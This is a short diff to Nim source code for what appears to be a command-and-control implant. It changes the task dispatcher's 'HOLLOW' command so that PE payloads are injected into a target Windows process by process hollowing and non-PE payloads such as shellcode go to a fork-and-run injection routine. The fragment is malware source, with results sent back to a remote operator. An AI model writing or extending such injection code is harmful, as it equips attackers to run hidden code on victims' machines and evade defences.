@@ -1484,10 +1484,13 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
 
   of "HOLLOW":
     when defined(windows):
-      if payload.len == 0: t.sendResult(id, "", "HOLLOW: no PE payload"); return
+      if payload.len == 0: t.sendResult(id, "", "HOLLOW: no payload"); return
       try:
         let tgt = parseJson(args){"target"}.getStr("")
-        t.sendResult(id, doHollow(tgt, payload), "")
+        if payload.len < 2 or payload[0] != 0x4D'u8 or payload[1] != 0x5A'u8:
+          t.sendResult(id, doForkRun(tgt, payload), "")
+        else:
+          t.sendResult(id, doHollow(tgt, payload), "")
       except: t.sendResult(id, "", "hollow: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "HOLLOW: not supported on Linux")
